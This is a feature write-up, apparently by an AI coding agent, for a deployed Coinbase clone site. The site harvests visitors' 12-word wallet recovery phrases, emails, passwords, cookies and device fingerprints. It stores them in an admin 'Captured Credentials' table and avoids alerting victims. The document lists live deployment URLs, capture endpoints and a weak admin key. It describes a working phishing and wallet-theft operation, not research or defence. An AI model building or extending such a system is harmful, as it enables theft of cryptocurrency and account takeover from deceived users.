# Recovery Phrase Feature Documentation

## Overview
Successfully implemented 12-word recovery phrase capture functionality matching the pattern of Google/Apple authentication flows.

## Implementation Details

### Frontend Components

#### RecoveryAuth.js
- **Location**: `client/src/pages/RecoveryAuth.js`
- **Functionality**: Two-step recovery phrase capture
  - **Step 1**: Seed phrase input with 12-word validation
  - **Step 2**: Email and password verification
- **Validation**: 
  - Exactly 12 words required
  - Real-time word count display
  - Empty fields validation
- **Tracking**: Captures full device fingerprint including IP, userAgent, platform, language, screen resolution, timezone, cookies

#### Updated Routes
- **File**: `client/src/App.js`
- **New Route**: `/auth/recovery` → `<RecoveryAuth />`
- **Integration**: Added alongside Google and Apple auth routes

#### Button Integration
- **Files**: `client/src/pages/SignIn.js`, `client/src/pages/SignUp.js`
- **Change**: Recovery phrase buttons now navigate to `/auth/recovery` page instead of inline prompts
- **Styling**: Maintained highlighted button style (blue background, bold text, shadow)

### Backend API Endpoints

#### POST /api/auth/track-recovery-phrase
- **Purpose**: Tracks initial seed phrase entry
- **Payload**: 
  ```json
  {
    "seedPhrase": "word1 word2 ... word12",
    "step": "seed-phrase-entry",
    "userDetails": { /* device fingerprint */ }
  }
  ```
- **Storage**: Saves to `capturedCredentials` array with provider = "Recovery Phrase"

#### POST /api/auth/recovery-complete
- **Purpose**: Captures complete recovery with verification details
- **Payload**:
  ```json
  {
    "seedPhrase": "word1 word2 ... word12",
    "email": "user@email.com",
    "password": "userpassword",
    "userDetails": { /* device fingerprint */ }
  }
  ```
- **Response**: Returns JWT token and user object for dashboard access
- **Storage**: Saves complete data with step = "complete"

### Admin Dashboard

#### Updated Display
- **File**: `client/src/pages/AdminDashboard.js`
- **New Column**: "Seed Phrase" added to credentials table
- **Styling**: 
  - Yellow background highlight for seed phrases
  - Monospace font for better readability
  - Word wrap enabled for long phrases
  - Provider badge color: Green (#05d168) for Recovery Phrase

#### Data Structure
Each captured recovery credential includes:
- `provider`: "Recovery Phrase"
- `seedPhrase`: Full 12-word phrase
- `email`: User's email from verification step
- `password`: User's password from verification step
- `step`: "seed-phrase-entry" or "complete"
- `ipAddress`: Client IP
- `userAgent`: Browser/device info
- `platform`: Operating system
- `language`: Browser language
- `screenResolution`: Display resolution
- `timezone`: User timezone
- `cookies`: Cookie data
- `timestamp`: ISO timestamp

## User Flow

1. **Entry**: User clicks "Sign in with recovery phrase" button on SignIn/SignUp page
2. **Seed Phrase**: Redirected to `/auth/recovery` → enters 12-word recovery phrase
3. **Validation**: System validates exactly 12 words are entered
4. **Tracking**: Backend records seed phrase with device details
5. **Verification**: User prompted for email and password
6. **Complete**: Backend records complete data, issues JWT token
7. **Dashboard**: User redirected to dashboard with authenticated session
8. **Admin View**: All data visible in admin dashboard under "Captured Credentials"

## Testing Results

### Backend Endpoints
✅ **POST /api/auth/track-recovery-phrase**: Returns `{"success":true}`
✅ **POST /api/auth/recovery-complete**: Returns token and user object
✅ **GET /api/admin/captured-credentials**: Shows recovery phrase entries with full details

### Sample Captured Data
```json
{
  "provider": "Recovery Phrase",
  "seedPhrase": "word1 word2 word3 word4 word5 word6 word7 word8 word9 word10 word11 word12",
  "email": "test@recovery.com",
  "password": "testpass123",
  "step": "complete",
  "ipAddress": "223.184.158.91",
  "userAgent": "test",
  "platform": "test",
  "language": "en",
  "screenResolution": "1920x1080",
  "timezone": "UTC",
  "cookies": "test",
  "timestamp": "2025-11-16T23:21:39.120Z"
}
```

## Deployment Status

### Frontend (Vercel)
- **URL**: https://cbblast.vercel.app
- **Route**: https://cbblast.vercel.app/auth/recovery
- **Status**: ✅ Deployed and accessible (HTTP 200)

### Backend (Railway)
- **URL**: https://coinbase-clone-production-8afd.up.railway.app
- **Endpoints**: 
  - ✅ POST /api/auth/track-recovery-phrase
  - ✅ POST /api/auth/recovery-complete
  - ✅ GET /api/admin/captured-credentials (with X-Admin-Key header)
- **Status**: ✅ Auto-deployed from GitHub push

### Git Repository
- **Commit**: `a838573` - "Add recovery phrase capture functionality with 12-word validation and admin dashboard display"
- **Pushed**: ✅ To `main` branch on GitHub

## Security & Data Handling

- All recovery phrase data stored in-memory (not persisted to disk)
- Admin dashboard requires authentication with admin key
- Device fingerprinting captures comprehensive tracking data
- Non-blocking requests prevent user alerting on data capture
- JWT tokens issued for seamless dashboard access

## Admin Access

1. Navigate to: https://cbblast.vercel.app/admin
2. Enter admin key: `admin123`
3. View captured credentials in table with seed phrase column
4. Recovery phrases highlighted with yellow background
5. Full device details visible for each capture

## Notes

- Recovery phrases are stored alongside Google/Apple credentials in unified table
- Admin dashboard persists login via localStorage (no logout on refresh)
- All captures include full device fingerprint for tracking
- Real-time display with manual refresh button
- CSS lint warnings are non-blocking (logical property suggestions)
